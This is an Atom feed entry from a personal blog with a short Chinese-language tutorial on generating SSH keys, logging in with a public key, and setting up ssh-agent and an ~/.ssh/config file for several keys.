    <id>https://arrnitage.github.io/%E5%A4%9A%E4%B8%AAsshkey%E7%AE%A1%E7%90%86/</id>
    <published>2020-07-27T14:28:24.000Z</published>
    <updated>2023-01-06T01:40:21.366Z</updated>
    
    <content type="html"><![CDATA[<p>在使用服务器中通常通过公钥进行ssh登陆，登陆不同的服务器使用不同的公钥，下面是我遇到多个公钥管理时对配置方法的记录。</p><h2 id="生成sshkey"><a href="#生成sshkey" class="headerlink" title="生成sshkey"></a>生成sshkey</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;your@email.com&quot;</span></span><br></pre></td></tr></table></figure><p>执行以上命令后有三个步骤：</p><ol><li>设置生成的密钥对文件名，默认为 <code>id_rsa</code>，<code>id_rsa.pub</code>。其中以pub结尾的为公钥。</li><li>设置密钥对密码</li><li>重复密码</li></ol><h2 id="使用公钥登陆"><a href="#使用公钥登陆" class="headerlink" title="使用公钥登陆"></a>使用公钥登陆</h2><ol><li><p>将 <code>id_rsa.pub</code>的内容拷贝至要登陆的服务器的 <code>～/.ssh/authorized_keys</code>中，一行一个公钥</p></li><li><p>ssh命令指定公钥登陆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa user@host</span><br></pre></td></tr></table></figure></li></ol><h2 id="配置多个公钥"><a href="#配置多个公钥" class="headerlink" title="配置多个公钥"></a>配置多个公钥</h2><ol><li><p>将私钥添加进 <code>ssh-agent</code>中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-add ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure></li><li><p>配置ssh的config文件。先在 <code>~/.ssh</code>目录下创建 <code>config</code>文件并进行编辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 注释</span><br><span class="line">Host 192.168.100.1</span><br><span class="line">    HostName 192.168.100.1</span><br><span class="line">    PreferredAuthentications publickey</span><br><span class="line">    IdentityFile ~/.ssh/id_ras</span><br><span class="line">    User root</span><br><span class="line">    Port 22</span><br></pre></td></tr></table></figure></li><li><p>保存退出</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在使用服务器中通常通过公钥进行ssh登陆，登陆不同的服务器使用不同的公钥，下面是我遇到多个公钥管理时对配置方法的记录。&lt;/p&gt;
&lt;h2 id=&quot;生成sshkey&quot;&gt;&lt;a href=&quot;#生成sshkey&quot; class=&quot;headerlink&quot; title=&quot;生成sshkey&quot;</summary>
      
    
    
    
    
  </entry>
  
</feed>
